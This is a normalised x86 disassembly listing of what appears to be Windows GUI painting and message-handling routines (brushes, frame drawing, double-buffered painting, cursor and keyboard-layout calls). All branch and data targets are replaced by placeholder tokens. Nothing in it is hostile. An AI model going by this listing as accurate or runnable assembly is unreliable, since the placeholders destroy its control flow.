push esi
push edi
push ebp
add esp 0xffffffe0
mov ebx ecx
mov ebp edx
mov esi eax
cmp [ esi + 0x1a8 ] 0x0
je r-xdata
mov eax [ esi + 0x198 ]
test eax eax
je r-xdata
cmp [ esi + 0x1a7 ] 0x0
je r-xdata
mov eax [ esi + 0x19c ]
test eax eax
je r-xdata
xor edi edi
test ebx ebx
je r-xdata
cmp [ esi + 0x17c ] 0x0
je r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov eax [ esi + 0x198 ]
mov eax [ eax + 0x8 ]
mov [ esp ] eax
cmp edi [ esp ]
jge r-xdata
mov edx ebx
call sub_413914
mov edi eax
test edi edi
jge r-xdata
mov eax [ esi + 0x17c ]
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x20 ]
inc eax
mov [ esp + 0xc ] eax
xor edi edi
mov eax [ esi + 0x198 ]
mov edx edi
call sub_4138b8
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
xor edi edi
inc edi
dec [ esp + 0xc ]
jne r-xdata
test [ ebx + 0x50 ] 0x10
je r-xdata
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x14 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_412484
lea eax [ esp + 0x10 ]
push eax
push ebp
call RectVisible
test eax eax
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax [ esi + 0x19c ]
mov edx edi
call sub_4138b8
mov ebx eax
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
inc edi
cmp edi [ esp ]
jl r-xdata
test [ esi + 0x54 ] 0x80
je r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
mov eax 0xff000010
call sub_41c09c
push eax
call CreateSolidBrush
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x18 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
mov edx [ ebx + 0x44 ]
dec edx
mov eax [ ebx + 0x40 ]
dec eax
call sub_412484
lea eax [ esp + 0x14 ]
push eax
push ebp
call FrameRect
mov eax [ esp + 0x8 ]
push eax
call DeleteObject
mov eax 0xff000014
call sub_41c09c
push eax
call CreateSolidBrush
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
inc eax
push eax
lea eax [ esp + 0x18 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
inc ecx
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_412484
lea eax [ esp + 0x14 ]
push eax
push ebp
call FrameRect
mov eax [ esp + 0x8 ]
push eax
call DeleteObject
test [ ebx + 0x1c ] 0x10
je r-xdata
push ebp
call SaveDC
mov [ esp + 0x4 ] eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebp
call sub_4334f0
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push ebp
call IntersectClipRect
push 0x0
mov ecx ebp
mov edx 0xf
mov eax ebx
call sub_435d5c
mov eax [ esp + 0x4 ]
push eax
push ebp
call RestoreDC
and [ ebx + 0x54 ] 0xff7f
or [ ebx + 0x54 ] 0x80
test [ ebx + 0x51 ] 0x4
jne r-xdata
sub_4393cc
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x80
push esi
call SaveDC
mov [ ebp - 0xc ] eax
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax esi
call sub_4334f0
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
xor edi edi
xor eax eax
mov [ ebp - 0x8 ] eax
push 0xffffffec
mov eax ebx
call sub_43b390
push eax
call GetWindowLongA
test ah 0x2
je r-xdata
push 0xfffffff0
mov eax ebx
call sub_43b390
push eax
call GetWindowLongA
test eax 0x800000
je r-xdata
mov [ ebp - 0x8 ] 0xa
mov edi 0x200f
jmp r-xdata
test edi edi
je r-xdata
mov [ ebp - 0x8 ] 0x3
mov edi 0xa00f
push 0x0
mov ecx esi
mov edx 0x14
mov eax ebx
call sub_435d5c
push 0x0
mov ecx esi
mov edx 0xf
mov eax ebx
call sub_435d5c
mov eax [ ebx + 0x19c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x20 ]
push eax
call SetRect
push edi
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
push esi
call DrawEdge
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_4334f0
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
mov eax [ ebp - 0xc ]
push eax
push esi
call RestoreDC
and [ ebx + 0x54 ] 0xff7f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x10 ]
jne r-xdata
mov edx [ eax + 0x44 ]
push edx
mov ecx [ eax + 0x40 ]
mov edx esi
call sub_4393cc
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x19c ]
call sub_4138b8
cmp [ eax + 0x57 ] 0x0
je r-xdata
sub_439520
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1f8 ] 0x0
je r-xdata
test [ ebx + 0x55 ] 0x1
jne r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_439044
jmp r-xdata
mov eax ebx
call sub_4380c0
test eax eax
jne r-xdata
push 0x0
call GetDC
mov edi eax
lea edx [ ebp - 0x5c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x50 ]
push eax
lea edx [ ebp - 0x6c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x64 ]
push eax
push edi
call CreateCompatibleBitmap
mov [ ebp - 0x8 ] eax
push edi
push 0x0
call ReleaseDC
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call SelectObject
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_439672
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4c ]
push eax
mov eax ebx
call sub_43b390
push eax
call BeginPaint
mov edi eax
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx 0x14
mov eax ebx
call sub_435d5c
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
mov edx esi
mov eax ebx
call sub_439520
xor eax eax
mov [ esi + 0x4 ] eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x5c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x50 ]
push eax
lea edx [ ebp - 0x6c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x64 ]
push eax
push 0x0
push 0x0
push edi
call BitBlt
lea eax [ ebp - 0x4c ]
push eax
mov eax ebx
call sub_43b390
push eax
call EndPaint
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
call DeleteObject
retn
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
sub_439680
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_439010
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4396a0
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_439010
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_439714
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_439010
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_439734
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_439010
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_439754
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_439010
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_439778
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_439010
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43979c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_439010
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4397c0
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_439010
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4397e4
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
call sub_42c460
mov edi eax
mov eax edi
call sub_42c540
test al al
je r-xdata
cmp [ ebx + 0x1f8 ] 0x0
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x170 ]
call sub_41cd7c
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
jne r-xdata
test [ ebx + 0x52 ] 0x4
je r-xdata
mov [ esi + 0xc ] 0x1
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_43b390
mov edx eax
mov ecx [ esi + 0x4 ]
mov eax edi
call sub_42c6d8
jmp r-xdata
sub_43986c
push ebx
push esi
push edi
push ecx
mov esi edx
mov edi eax
cmp [ edi + 0x1a5 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x50 ] 0x10
je r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x2
jne r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi + 0x180 ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x8
je r-xdata
mov [ esp ] al
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x1
jne r-xdata
mov al 0x1
mov bl 0x1
xor eax eax
jmp r-xdata
mov eax [ edi + 0x180 ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x1 ] al
test bl bl
je r-xdata
mov al 0x1
test [ edi + 0x55 ] 0x2
jne r-xdata
mov al [ esp ]
or al [ esp + 0x1 ]
je r-xdata
mov edx esi
mov eax edi
call sub_436690
test bl bl
je r-xdata
mov eax edi
call sub_43b6a0
mov eax edi
call sub_43b298
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
or al [ esp + 0x1 ]
jne r-xdata
mov eax edi
call sub_43b298
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0xc0
je r-xdata
sub_43992c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
pop ebx
retn
mov esi [ edi + 0x8 ]
test [ esi + 0x18 ] 0x1
jne r-xdata
lea ecx [ esi + 0x14 ]
lea edx [ esi + 0x10 ]
mov eax ebx
call sub_4362ec
test al al
jne r-xdata
or [ esi + 0x18 ] 0x1
sub_43997c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_43b6a0
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax ebx
call sub_437c50
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffcf
call sub_403324
sub_4399c4
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
cmp eax [ ebx + 0x180 ]
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov ax [ esi + 0x8 ]
sub ax 0xfffe
je r-xdata
cmp [ esi + 0xa ] 0x201
jne r-xdata
sub ax 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov di [ eax + 0x44 ]
test di di
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
call GetLastActivePopup
mov edi eax
call GetForegroundWindow
cmp edi eax
je r-xdata
test di di
je r-xdata
push esp
call GetCursorPos
push 0x0
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_4346f8
lea edx [ esp + 0xc ]
xor ecx ecx
mov eax ebx
call sub_438c7c
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_455018
jmp r-xdata
movsx edx di
mov eax [ rw-data ]
mov eax [ eax ]
call sub_453500
push eax
call SetCursor
mov [ esi + 0xc ] 0x1
jmp r-xdata
test di di
jne r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
mov di [ eax + 0x78 ]
mov di 0xfffe
jmp r-xdata
mov di [ ebx + 0x78 ]
mov di 0xfffe
jmp r-xdata
sub_439b14
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_439bf3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439bfa
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
cmp [ ebx + 0x188 ] 0x0
je r-xdata
mov eax ebx
call sub_43b390
mov dl [ ebx + 0x184 ]
call sub_43fff0
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_453478
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x188 ]
call sub_407c1c
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_453278
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov esi [ eax + 0x3c ]
cmp [ ebx + 0x184 ] 0x0
je r-xdata
push 0x1
push esi
call ActivateKeyboardLayout
mov eax [ rw-data ]
mov eax [ eax ]
call sub_453278
mov edx [ ebx + 0x188 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov edi eax
test edi edi
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_453278
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov esi eax
sub_439c00
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_439c8a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_439c91
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
cmp [ ebx + 0x188 ] 0x0
je r-xdata
cmp [ ebx + 0x184 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_453478
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x188 ]
call sub_407c1c
test eax eax
je r-xdata
mov eax ebx
call sub_43b390
mov dl 0x1
call sub_43ffd4
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x3c ]
push eax
call ActivateKeyboardLayout
sub_439cec
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dx [ ebp + 0x8 ]
mov eax edi
call sub_412474
push eax
mov ecx esi
mov edx 0xb038
mov eax ebx
call sub_435d5c
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
cmp [ ebx + 0x1b2 ] 0x0
je r-xdata
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x1b4 ]
call [ ebx + 0x1b0 ]
sub_439d3c
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1ba ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0xc
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov cl [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x1bc ]
call [ ebx + 0x1b8 ]
sub_439d70
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov si 0xffd2
call sub_403324
mov eax [ ebp + 0x10 ]
push eax
mov al [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
mov si 0xffc3
call sub_403324
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_439db0
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
cmp [ ebx + 0x1f2 ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esi
lea eax [ esp + 0x4 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x1f4 ]
call [ ebx + 0x1f0 ]
xor eax eax
jmp r-xdata
push edi
mov ecx esi
mov edx 0xb039
mov eax ebx
call sub_435d5c
test eax eax
je r-xdata
mov [ esp ] al
mov al [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_439e08
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_419778
mov edx [ r-xdata ]
call sub_4032d8
mov [ edi ] eax
pop edi
pop esi
pop ebx
retn
sub_439e40
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x178 ]
test esi esi
je r-xdata
xor eax eax
mov edx edi
mov eax esi
call sub_4138b8
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_439e64
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov edi edx
mov ebx eax
push esi
mov eax ebx
call sub_43b390
push eax
call GetWindowRect
push 0xa
push 0xa
push esi
call InflateRect
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
push esi
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
sub_439ec0
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_439e2c
mov edi eax
test edi edi
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov ebx edi
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x178 ]
call sub_4138b8
cmp [ eax + 0x57 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
dec edi
sub_439f00
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x17c ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x17c ]
call sub_4054cc
cmp [ ebx + 0x1a8 ] 0x0
je r-xdata
mov al 0x1
cmp [ esi ] 0x0
jne r-xdata
cmp [ ebx + 0x1a7 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x24 ]
mov edx eax
test edx edx
je r-xdata
mov [ ebx + 0x1f8 ] al
pop esi
pop ebx
retn
mov eax esi
call sub_4054cc
jmp r-xdata
sub edx 0xffffff8c
cmp [ ebx + 0x1f8 ] 0x0
jne r-xdata
sub_439f6c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_43a014
push [ fs : eax ]
mov [ fs : eax ] esp
cmp bl [ edi + 0x1a8 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a01b
lea eax [ ebp - 0x4 ]
call sub_4054b4
retn
mov [ edi + 0x1a8 ] bl
test [ edi + 0x1c ] 0x10
jne r-xdata
mov edx ebx
mov eax edi
call sub_432860
test bl bl
jne r-xdata
cmp [ edi + 0x178 ] 0x0
jne r-xdata
mov eax [ edi + 0x178 ]
call sub_403128
xor eax eax
mov [ edi + 0x178 ] eax
lea eax [ edi + 0x17c ]
call sub_4054b4
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffc6
call sub_403324
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x17c ]
call sub_4054cc
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ edi + 0x178 ] eax
sub_43a024
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
lea esi [ eax + 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x2
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43b390
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x4 ]
call sub_437c28
xor edx edx
push ebp
push sub_43a0e6
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x38 ]
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
mov si 0xffcc
call sub_403324
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a0ed
mov eax [ ebp - 0x4 ]
call sub_437c30
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ eax + 0x58 ]
push edx
mov edx [ ebp - 0x8 ]
mov cl [ eax + 0x54 ]
mov edx [ ebp - 0x8 ]
mov edx [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x17c ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
sub_43a0ed
mov eax [ ebp - 0x4 ]
call sub_44c6fc
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_434e14
sub_43a138
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x58 ]
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_403070
cmp esi eax
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_436a1c
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x57 ]
mov [ ebp - 0x5 ] al
xor eax eax
push ebp
push sub_43a1a2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x8 ]
lea ecx [ eax + 0x44 ]
xor edx edx
mov eax [ ebp - 0x4 ]
mov si 0xffcc
call sub_403324
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
retn
mov eax [ ebp - 0x4 ]
call sub_434e14
sub_43a1bc
push ebx
push ecx
mov [ esp ] cl
cmp [ eax + 0x1da ] 0x0
je r-xdata
pop edx
pop ebx
retn
mov cl [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1dc ]
call [ ebx + 0x1d8 ]
sub_43a1e4
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_44c6fc
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ edi + 0x8 ]
call sub_44c604
mov [ esp ] al
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
lea edx [ edi + 0x4 ]
mov cl [ esp ]
mov eax esi
mov si 0xffbc
call sub_403324
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_43a1e4
test al al
jne r-xdata
sub_43a24c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43a1e4
test al al
jne r-xdata
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_43c4b8
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43a278
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43a1e4
test al al
jne r-xdata
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_43c4b8
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43a2a4
push ebx
push ecx
mov [ esp ] cl
cmp [ eax + 0x1ea ] 0x0
je r-xdata
pop edx
pop ebx
retn
mov cl [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1ec ]
call [ ebx + 0x1e8 ]
sub_43a2cc
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_44c6fc
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ edi + 0x8 ]
call sub_44c604
mov [ esp ] al
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
lea edx [ edi + 0x4 ]
mov cl [ esp ]
mov eax esi
mov si 0xffbb
call sub_403324
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_43a2cc
test al al
jne r-xdata
sub_43a334
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43a2cc
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43a354
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43a2cc
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
